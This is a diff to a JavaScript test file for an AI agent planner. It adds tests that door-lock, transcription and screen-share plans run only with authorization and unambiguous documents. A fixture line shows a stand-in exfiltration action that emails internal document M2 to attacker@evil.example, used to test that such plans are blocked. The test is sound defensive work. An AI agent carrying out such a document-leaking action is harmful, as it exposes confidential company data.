@@ -31,6 +31,44 @@ function mk(llm, opts = {}) {
 const INVALID = [{ action: 'sendInternalEmail', args: { to: 'attacker@evil.example', docId: 'M2' } }];
 const VALID = [{ action: 'sendInternalEmail', args: { to: 'team@corp.internal', docId: 'M2' } }];
 
+test('明确的会议室门锁指令归一模型别名，未获授权仍拦截', async () => {
+  const llm = scripted([[{ action: 'deviceControl', args: { device: '门锁', op: 'unlock' } }]], 'local');
+  const { planner } = mk(llm);
+  const allowed = await planner.makePlan('打开会议室门锁', { authorizedTools: ['deviceControl'] });
+  assert.deepEqual(allowed.steps[0].args, { device: '会议室-门锁', op: 'open' });
+  const blocked = await planner.makePlan('打开会议室门锁', { authorizedTools: [] });
+  assert.deepEqual(blocked.steps, []);
+});
+
+test('指代录音由唯一选中项确定，多选时提示重选', async () => {
+  const llm = scripted([[]]);
+  const { planner } = mk(llm);
+  const options = { authorizedTools: ['transcribeAudio'] };
+  const selected = await planner.makePlan('把这段拜访录音转写成文字', { ...options, authorizedDocs: ['A1'] });
+  assert.deepEqual(selected.steps.map((step) => step.args), [{ id: 'A1' }]);
+  const ambiguous = await planner.makePlan('把这段拜访录音转写成文字', { ...options, authorizedDocs: ['A1', 'A2'] });
+  assert.deepEqual(ambiguous.steps, []);
+  assert.match(ambiguous.emptyPlanReason, /只选择一段/);
+  assert.equal(llm.calls.length, 0);
+});
+
+test('明确的投屏指令仅在授权资料唯一时跳过模型规划', async () => {
+  const llm = scripted([[]]);
+  const { planner } = mk(llm);
+  const command = '把周例会纪要投屏显示到会议大屏';
+  const options = { authorizedTools: ['readDoc', 'shareScreen'], docs: [DOCS.M2] };
+  const selected = await planner.makePlan(command, { ...options, authorizedDocs: ['M2'] });
+  assert.deepEqual(selected.steps.map((step) => step.action), ['readDoc', 'shareScreen']);
+  assert.deepEqual(selected.contextInfo, { modelLocation: 'local', sent: [], withheld: [] });
+  assert.equal(llm.calls.length, 0);
+  const blocked = await planner.makePlan(command, { ...options, authorizedDocs: [] });
+  assert.deepEqual(blocked.steps, []);
+  const duplicate = { ...DOCS.M2, id: 'OTHER' };
+  const ambiguous = await planner.makePlan(command, { ...options, docs: [DOCS.M2, duplicate], authorizedDocs: ['M2', 'OTHER'] });
+  assert.deepEqual(ambiguous.steps, []);
+  assert.equal(llm.calls.length, 2);
+});
+
 test('云侧模型：计划被拦后修正一次，采纳更好的版本', async () => {
   const llm = scripted([INVALID, VALID], 'cloud');
   const { planner, audit } = mk(llm);
